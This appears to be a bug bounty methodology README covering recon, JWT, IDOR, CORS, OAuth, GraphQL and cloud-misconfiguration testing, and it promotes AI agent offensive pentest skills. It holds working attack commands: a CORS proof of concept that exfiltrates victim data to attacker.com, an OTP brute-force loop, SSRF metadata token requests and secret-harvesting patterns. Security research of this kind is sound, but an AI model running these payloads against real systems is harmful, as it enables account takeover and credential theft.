# Bug Bounty Skills & Approach

A practical, technique-first playbook built from real H1 disclosures, CVE research, and hands-on bounty hunting.  

---

## Table of Contents

1. [Target Selection](#1-target-selection)
2. [Recon & Attack Surface Mapping](#2-recon--attack-surface-mapping)
3. [Authentication Testing](#3-authentication-testing)
4. [Authorization / IDOR / BOLA](#4-authorization--idor--bola)
5. [API Security](#5-api-security)
6. [CORS Misconfigurations](#6-cors-misconfigurations)
7. [OAuth 2.0 / OIDC Testing](#7-oauth-20--oidc-testing)
8. [Information Disclosure](#8-information-disclosure)
9. [JavaScript Bundle Analysis](#9-javascript-bundle-analysis)
10. [GraphQL Testing](#10-graphql-testing)
11. [Cloud Misconfigurations](#11-cloud-misconfigurations)
12. [Reporting That Gets Paid](#12-reporting-that-gets-paid)
13. [Tools](#13-tools)
14. [GitLab IDOR Hitlist](#14-gitlab-idor-hitlist)
15. [OSINT / External Attack Surface Skill](#15-osint--external-attack-surface-skill)

---

## 1. Target Selection

**Pick programs where effort-to-payout is favorable:**

- Prefer programs with **wide scope** (wildcards `*.company.com`) over narrow ones
- Avoid mega-programs (HackerOne Top 10) — saturated, duplicates are common
- Look for **newer programs** (< 6 months) or recently expanded scope
- Fintech / payments / auth platforms pay more for the same severity
- Check response SLA — programs that take 90+ days to triage aren't worth it

**Red flags to skip:**
- No bounty table (VDP only) unless it's a stepping stone
- Crypto / adult / niche uneven sites — low signal, high noise
- Programs with "no automated testing" on everything — limits attack surface badly

**Green flags:**
- API-first companies (rich attack surface, often less-tested)
- Companies using managed auth (Auth0, Frontegg, Okta) — misconfigs are common
- Companies that recently migrated to AWS/GCP — cloud misconfig window
- Self-hosted open-source (GitLab, Mattermost) — test locally first

---

## 2. Recon & Attack Surface Mapping

### Subdomain Enumeration
```bash
subfinder -d target.com -o subs.txt
httpx -l subs.txt -status-code -title -tech-detect -o live.txt
```

### JS File Discovery
```bash
# Find all JS bundles loaded by the app
curl -s https://app.target.com | grep -oE 'src="[^"]*\.js"' | cut -d'"' -f2
# Or use katana for crawling
katana -u https://app.target.com -jc -o js-urls.txt
```

### Common Sensitive Paths (try on every target)
```bash
/.env
/.env.local
/.env.production
/actuator/env          # Spring Boot — returns ALL env vars
/actuator/info
/actuator/configprops
/actuator/beans
/internal/config/anonymous   # LaunchDarkly pattern — 362KB of creds
/api/config
/config.json
/bootstrap
/__config
/.git/config           # exposed git repo
/server-status         # Apache mod_status
/debug/vars            # Go pprof
```

### Technology Fingerprinting
```bash
# Check response headers for tech stack
curl -si https://app.target.com | grep -i 'x-powered-by\|server\|x-generator\|via'

# Common framework giveaways:
# X-Powered-By: Express → Node.js
# X-Powered-By: PHP → PHP
# Via: 1.1 cloudfront → AWS CloudFront
# Server: nginx/1.2x.x → version disclosure
```

---

## 3. Authentication Testing

### JWT Testing
```bash
# Decode a JWT without verification
echo "PASTE_JWT_HERE" | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool

# Test algorithm confusion (none attack)
# Change alg to "none", remove signature, keep trailing dot
# Tools: jwt_tool, portswigger JWT editor

# Test HS256 → RS256 confusion
# If server uses RS256, sign with public key as HS256 secret
```

**Common JWT bugs:**
- `alg: none` accepted
- Weak HS256 secret (brute force with hashcat: `hashcat -a 0 -m 16500 token.txt wordlist.txt`)
- Missing `exp` validation (eternal tokens)
- `kid` header injection → SQL injection or path traversal
- JWT stored in localStorage accessible to XSS

### Session Management
```bash
# Check cookie flags
curl -si https://app.target.com/login | grep -i 'set-cookie'
# Look for: Secure, HttpOnly, SameSite=Strict/Lax
# Missing Secure = cookie sent over HTTP
# Missing HttpOnly = JS-accessible, XSS-stealable
# SameSite=None without Secure = CSRF + cross-site cookie delivery
```

---

## 4. Authorization / IDOR / BOLA

**The core primitive:** Can user A access user B's private resource by changing an ID?

### REST API IDOR Pattern
```bash
# Step 1: authenticate as victim (user B), create a resource
# Step 2: note the resource ID
# Step 3: switch to attacker token (user A), try to access same ID
curl -H "Authorization: Bearer ATTACKER_TOKEN" \
  https://api.target.com/v1/documents/VICTIM_DOC_ID

# Expect 403 or 404. A 200 with victim data = IDOR
```

### IDOR Surfaces to Always Check
| Surface | Pattern |
|---------|---------|
| Direct object IDs | `/api/orders/12345` → try adjacent IDs |
| UUIDs | Still worth trying — UUIDs aren't authorization |
| Indirect references | `/api/me/invoices` → change user context |
| Batch endpoints | `GET /api/users?ids[]=1,2,3` |
| Export/download | `GET /api/export?report_id=X` |
| Notifications | `/api/notifications/X` — often forgotten |
| Admin endpoints | `/api/admin/users/X` with non-admin token |

### GraphQL IDOR
```bash
# GraphQL authz bugs: REST endpoint denies, GraphQL resolver allows
curl -X POST https://api.target.com/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer ATTACKER_TOKEN" \
  -d '{"query":"{ user(id: VICTIM_ID) { email phone privateData } }"}'

# Also try introspection to find hidden fields
curl -X POST https://api.target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name fields { name } } } }"}'
```

### GitLab IDOR Hitlist (from disclosed H1 reports)

| # | Endpoint | Severity | H1 Precedent |
|---|----------|----------|--------------|
| 1 | `GET /api/v4/projects/:id` | 🟥 High | Base IDOR |
| 2 | `GET /api/v4/projects/:id/issues` | 🟥 High | #502593 |
| 3 | `GET /api/v4/projects/:id/merge_requests` | 🟥 High | #195134, #692252 |
| 4 | `GET /api/v4/projects/:id/pipelines/:pid/variables` | 🟥 High | CVE-2025-14594 |
| 5 | `GET /api/v4/projects/:id/jobs/:jid/artifacts` | 🟥 High | CVE-2024-10219 |
| 6 | `GET /api/v4/projects/:id/repository/tree` | 🟥 High | #446585 ($11k) |
| 7 | `GET /api/v4/projects/:id/ml/models` | 🟥 High | #2528293 ($1,160) |
| 8 | `GET /api/v4/groups/:id/labels` | 🟧 Med | #439729 |
| 9 | `GET /api/v4/search?scope=blobs&search=secret` | 🟧 Med | #692252 |
| 10 | `POST /api/graphql` project query | 🟥 High | #1192460 |

---

## 5. API Security

### Unauthenticated Endpoint Discovery
```bash
# Remove auth header and retry every endpoint — some skip auth checks
curl https://api.target.com/v1/users          # authenticated endpoint
curl https://api.target.com/v1/users          # without token — still 200?

# Common auth bypass patterns:
# - /api/v1/admin/users → 403, but /api/v1/admin/../users → 200
# - /api/v1/users → 403, but /api/v2/users → 200 (old version)
# - /api/v1/users → 403, but /API/v1/users → 200 (case-insensitive)
```

### HTTP Method Tampering
```bash
# Endpoint only expects GET but POST/PUT/DELETE not blocked?
curl -X DELETE https://api.target.com/v1/users/123 -H "Auth: ..."
curl -X PUT https://api.target.com/v1/users/123 -d '{"role":"admin"}' -H "Auth: ..."

# Some APIs have method override headers
curl -X POST -H "X-HTTP-Method-Override: DELETE" https://api.target.com/...
```

### Mass Assignment
```bash
# API accepts extra fields it shouldn't
curl -X PUT https://api.target.com/v1/profile \
  -d '{"name":"hacker","role":"admin","is_verified":true,"credits":99999}'
# If any extra field is reflected or saved, it's mass assignment
```

### Rate Limiting
```bash
# OTP/password reset without rate limit = account takeover
for i in {1..100}; do
  curl -s -X POST https://api.target.com/v1/auth/otp/verify \
    -d '{"otp":"'$i'","user_id":"victim"}' &
done
```

---

## 6. CORS Misconfigurations

**The three dangerous patterns:**

### Pattern 1: Arbitrary Origin Reflection
```bash
curl -si -H "Origin: https://evil.com" https://api.target.com/v1/me | grep -i access-control
# Dangerous: ACAO: https://evil.com + ACAC: true
```

### Pattern 2: Null Origin Acceptance
```bash
curl -si -H "Origin: null" https://api.target.com/v1/me | grep -i access-control
# Dangerous: ACAO: null + ACAC: true
# Exploitable from: <iframe sandbox>, data: URIs, local HTML files
```

### Pattern 3: Subdomain Wildcard
```bash
curl -si -H "Origin: https://evil.target.com" https://api.target.com/v1/me
# If ACAO: https://evil.target.com + ACAC: true → exploitable via subdomain takeover or XSS
```

### Exploitation PoC (null origin — no XSS needed)
```html
<iframe sandbox="allow-scripts" srcdoc="
<script>
fetch('https://api.target.com/v1/me', {credentials: 'include'})
  .then(r => r.json())
  .then(d => parent.postMessage(JSON.stringify(d), '*'));
</script>
"></iframe>
<script>
window.addEventListener('message', e => {
  fetch('https://attacker.com/exfil', {method:'POST', body: e.data});
});
</script>
```

**Severity guide:**
- Any origin + ACAC:true = **High** (account data readable cross-origin)
- null origin + ACAC:true = **High** (no precondition needed)
- Subdomain wildcard + ACAC:true = **Medium** (needs subdomain takeover or XSS first)

---

## 7. OAuth 2.0 / OIDC Testing

### Dynamic Client Registration (RFC 7591)
```bash
# Step 1: Check OIDC discovery for registration_endpoint
curl -s https://auth.target.com/.well-known/openid-configuration | python3 -m json.tool | grep registration

# Step 2: If present, register a malicious client
curl -X POST https://auth.target.com/oauth/register \
  -H "Content-Type: application/json" \
  -d '{
    "client_name": "Test App",
    "redirect_uris": ["https://evil.com/callback"],
    "grant_types": ["authorization_code"],
    "response_types": ["code"]
  }'
# Success = unauthenticated client registration → phishing redirect
```

### Redirect URI Bypass
```bash
# Try URI variations when redirect_uri is validated
redirect_uri=https://legit.com           # baseline
redirect_uri=https://legit.com@evil.com  # userinfo bypass
redirect_uri=https://legit.com.evil.com  # suffix match
redirect_uri=https://evil.com%2F@legit.com  # URL encoding
redirect_uri=https://legit.com/../../evil  # path traversal
redirect_uri=https://legit.com?redirect=https://evil.com  # open redirect chain
```

### Token Endpoint Attacks
```bash
# /revoke returning 500 = token revocation broken (security risk)
curl -X POST https://auth.target.com/revoke \
  -d 'token=any_value'

# /introspect without auth = token info leak
curl -X POST https://auth.target.com/introspect \
  -d 'token=STOLEN_TOKEN'
```

---

## 8. Information Disclosure

### Spring Boot Actuator (Java apps)
```bash
# These endpoints return everything if not locked down
curl https://api.target.com/actuator/env           # ALL env vars including secrets
curl https://api.target.com/actuator/configprops   # config with passwords
curl https://api.target.com/actuator/beans         # full Spring context
curl https://api.target.com/actuator/mappings      # all routes (great for recon)
curl https://api.target.com/actuator/httptrace     # recent HTTP requests with tokens!

# Also try: /manage/actuator/env, /admin/actuator/env
```

### AWS Error Message Leakage
```bash
# Misconfigured API Gateway / VPC Lattice returns raw IAM error
curl https://api.target.com/oauth2/token
# Watch for: AccessDeniedException with ARN, account ID, role name
# These expose: AWS account ID, IAM role ARN, internal service names, region
```

### SPA Config Endpoints
```bash
# React/Angular/Vue apps often expose config at these paths
curl https://app.target.com/internal/config/anonymous   # LaunchDarkly had this
curl https://app.target.com/config.json
curl https://app.target.com/api/config/public
curl https://app.target.com/bootstrap
curl https://app.target.com/__env
```

### Exposed .env and Config Files
```bash
for path in /.env /.env.local /.env.production /.env.backup /.env.dev; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" "https://target.com$path")
  [ "$code" = "200" ] && echo "FOUND: $path"
done
```

---

## 9. JavaScript Bundle Analysis

Modern SPAs embed credentials in their JS bundles. This is a high-yield technique on well-funded startups.

### Step 1: Find the bundle
```bash
# Get the main HTML and find script tags
curl -s https://app.target.com | grep -oE '(/static/js/[^"]+\.js|/assets/[^"]+\.js)' | head -5
```

### Step 2: Download and grep for secrets
```bash
curl -s "https://app.target.com/static/js/main.HASH.js" > bundle.js

# Search for common key patterns
grep -oE 'pk_live_[a-zA-Z0-9]{20,}' bundle.js          # Stripe publishable key
grep -oE 'sk_live_[a-zA-Z0-9]{20,}' bundle.js          # Stripe SECRET key (critical)
grep -oE 'AIza[a-zA-Z0-9_-]{35}' bundle.js             # Google API key
grep -oE '[a-z0-9]{8}-[a-z0-9]{4}-[a-z0-9]{4}-[a-z0-9]{4}-[a-z0-9]{12}' bundle.js  # UUIDs/keys
grep -oE '"writeKey"\s*:\s*"[a-zA-Z0-9]{30,}"' bundle.js  # Segment write key
grep -oE 'sub-c-[a-f0-9-]{36}' bundle.js               # PubNub subscribe key
grep -oE 'AKIA[A-Z0-9]{16}' bundle.js                   # AWS Access Key ID (critical)
grep -iE '(secret|api_key|apikey|token|password)\s*[:=]\s*["'"'"'][^"'"'"']{8,}' bundle.js
```

### Step 3: Verify each key
```bash
# Segment write key — can inject fake analytics events
curl -X POST https://api.segment.io/v1/track \
  -H "Content-Type: application/json" \
  -d '{"writeKey":"FOUND_KEY","event":"TestEvent","userId":"researcher"}'
# {"success":true} = key is live and writable

# PubNub subscribe key — can monitor real-time channels
curl "https://ps.pndsn.com/v2/subscribe/FOUND_KEY/,/0"
```

---

## 10. GraphQL Testing

### Introspection (schema enumeration)
```bash
# Full schema dump
curl -X POST https://api.target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name kind fields { name type { name kind } } } } }"}'

# If introspection is disabled, try field suggestions
curl -X POST https://api.target.com/graphql \
  -d '{"query":"{ unknownField }"}'
# Error messages often reveal real field names
```

### Batch Query Attack
```bash
# GraphQL batch = execute many operations at once = rate limit bypass
curl -X POST https://api.target.com/graphql \
  -d '[
    {"query":"{ user(id: 1) { email } }"},
    {"query":"{ user(id: 2) { email } }"},
    ...
  ]'
```

### IDOR via GraphQL when REST is blocked
```bash
# Common pattern: REST GET /v1/users/X → 403
# But GraphQL: { user(id: X) { ... } } → 200
curl -X POST https://api.target.com/graphql \
  -H "Authorization: Bearer ATTACKER_TOKEN" \
  -d '{"query":"{ project(fullPath: \"victim-user/private-repo\") { issues { nodes { title description } } } }"}'
```

---

## 11. Cloud Misconfigurations

### S3 Bucket Enumeration
```bash
# Check if a company's S3 bucket is public
curl -si "https://COMPANY-NAME.s3.amazonaws.com/"
# 403 = bucket exists but private (note the account)
# 200 = bucket is PUBLIC and listable (critical)
# 404 = bucket doesn't exist

# Also try common naming patterns
for name in company-assets company-static company-uploads company-backups; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" "https://$name.s3.amazonaws.com/")
  echo "$name: $code"
done
```

### AWS Error Message Leakage
When APIs are misconfigured (VPC Lattice, API Gateway), they return raw IAM errors:
```
AccessDeniedException: User: arn:aws:sts::110009069329:assumed-role/...
is not authorized to perform: vpc-lattice-svcs:Invoke on resource:
arn:aws:vpc-lattice:eu-west-1:110009069329:service/svc-0658043fde5397ec2/...
```
This leaks: AWS account ID, IAM role ARN, internal service names, region, VPC Lattice ARN.

### GCP / Azure Equivalents
```bash
# GCP metadata endpoint (from SSRF)
curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
  -H "Metadata-Flavor: Google"

# Azure IMDS
curl "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \
  -H "Metadata: true"
```

---

## 12. Reporting That Gets Paid

**What separates accepted reports from spam:**

### Structure
```
Title: [Component] Brief, specific, technical description
Severity: Your CVSS score + reasoning

Summary: 2-3 sentences. What is vulnerable, what can an attacker do.

Steps to Reproduce:
1. Concrete curl command or browser steps
2. Exact request + exact response
3. What to look for in the response

Impact: Specific, realistic attack scenario. Who can be attacked, what is stolen/modified.

Evidence: Actual output from your test. Screenshots or curl output.

Remediation: Specific fix, not generic "add authentication".
```

### Evidence checklist
- [ ] Exact curl command that reproduces the issue
- [ ] Raw HTTP response (headers + body)
- [ ] Timestamp of test
- [ ] Proof the finding is exploitable (not just theoretical)
- [ ] Tested against the in-scope asset (not a staging env)

### Severity calibration
| Bug | Typical Payout |
|-----|---------------|
| RCE, SQLi (unauthenticated) | $5k–$50k+ |
| Auth bypass / ATO | $2k–$15k |
| IDOR on sensitive data | $500–$5k |
| CORS with ACAC:true | $300–$2k |
| Info disclosure (credentials) | $200–$2k |
| Open redirect | $100–$500 |
| CORS without ACAC | Usually N/A |
| Self-XSS | Usually N/A |

### Common rejection reasons (avoid these)
- No ACAC:true on CORS = browsers won't expose the response
- Self-XSS = only affects own account
- Missing impact — describe a concrete victim, not "an attacker could..."
- Duplicate — always search disclosed reports first
- Out of scope — read the scope section carefully

---

## 13. Tools

| Tool | Purpose | Install |
|------|---------|---------|
| `subfinder` | Subdomain enumeration | `go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest` |
| `httpx` | HTTP probing at scale | `go install github.com/projectdiscovery/httpx/cmd/httpx@latest` |
| `katana` | JS-aware web crawler | `go install github.com/projectdiscovery/katana/cmd/katana@latest` |
| `nuclei` | Template-based vuln scanner | `go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest` |
| `ffuf` | Fuzzing (dirs, params, headers) | `go install github.com/ffuf/ffuf/v2@latest` |
| `jwt_tool` | JWT attack toolkit | `pip install jwt_tool` |
| `gf` | Grep patterns for bug bounty | `go install github.com/tomnomnom/gf@latest` |
| `trufflehog` | Secrets in JS/git repos | `brew install trufflesecurity/trufflehog/trufflehog` |
| `burpsuite` | HTTP proxy + scanner | [portswigger.net](https://portswigger.net) |

---

## 14. GitLab IDOR Hitlist

See [`gitlab-idor-hitlist.md`](./gitlab-idor-hitlist.md) for the full 16-endpoint table ranked by disclosed H1 report payout.

**Top 3 by ROI:**
1. `GET /api/v4/projects/:id/repository/tree` — #446585 ($11k), straightforward IDOR
2. `GET /api/v4/projects/:id/pipelines/:pid/variables` — CVE-2025-14594, CI secrets exposed
3. `POST /api/graphql` project query — REST denies, GraphQL allows (recurring pattern)

---

## 15. OSINT / External Attack Surface Skill

A full end-to-end **OSINT → external attack surface → exploitation** playbook lives at
[`skills/osint-pentest.md`](./skills/osint-pentest.md). It is a Claude Code slash-command
(`/osint-pentest <target>`) but reads as a standalone field manual (~3,000 lines).

**Structure:**
- **Phase 0** — Authorization & scope gate (mandatory; passive OSINT vs active testing rules)
- **Phase 1** — Passive recon, 31 sub-sections (CT logs, subdomain aggregators, JS source-map
  reconstruction, favicon/analytics pivoting, supply-chain, dark web, business intel, BGP/ASN, the two-lane hunting chain)
- **Phase 2** — Active recon (httpx/nuclei/screenshots, vhost fuzzing, 403 bypass matrix, param discovery)
- **Phase 3** — Vulnerability discovery + **Phase 3.5 exploitation playbooks** for the high-payout
  classes: ATO, IDOR/BOLA, race/logic/payment, SSRF→RCE, SSTI, XXE, SQLi, command-injection,
  deserialization, prototype pollution, XSS, CORS/postMessage/CSRF/clickjacking, API keys, WebSocket
- **Phase 3.6** — Cloud playbooks (AWS / Azure / GCP / Firebase / Kubernetes / Docker, read-only PoC)
- **Phase 3.7** — GraphQL deep-dive (engine quirks, BOLA/BFLA, injection, batching, CSRF, DoS)
- **Phase 4 / 4.5** — Android + iOS app testing
- **Phase 5** — Reporting (CVSS, bug-bounty submission templates, India disclosure contacts)
- **Appendices** — high-payout hunting checklist, methodology sources, Burp/Caido power-user workflow

Every technique lists the **mechanism**, the **exact payload/request**, and the **"tell"** (what in a
response signals the bug). Synthesized from 130+ disclosed reports, Medium writeups, and PortSwigger
research — see [`skills/osint-pentest.md` Appendix B](./skills/osint-pentest.md) for the full source list.

**Toolchain setup:** [`scripts/setup.sh`](./scripts/setup.sh) installs everything the playbook
references (idempotent — only fills gaps). macOS (Homebrew) + Debian/Ubuntu.
```bash
./scripts/setup.sh --check   # report installed vs missing, install nothing
./scripts/setup.sh --core    # high-signal recon/exploit subset only
./scripts/setup.sh           # install all missing tools
```

---

*Built from: H1 disclosed reports, CVE database, Medium writeups (lostsec, shahjerry33), real-world testing.*  
*Last updated: June 2026*

---

## 16. Claude Code Skills — Pentest Suite

The [`skills/`](skills/) directory ships drop-in [Claude Code](https://claude.com/claude-code) Skills covering the full offensive-security surface: `web-pentest`, `api-pentest`, `mobile-pentest`, `network-pentest`, `cloud-pentest`, `llm-appsec`, `source-code-review`, and `pentest-report` (plus the original `osint-pentest`).

Each pairs a hypothesis-driven attacker **doctrine** with an **executable arsenal** of commands and payloads sourced from current public research. Install with `cp -R skills/<name> ~/.claude/skills/` and invoke `/<name>`. See [skills/README.md](skills/README.md) for the full index and usage.
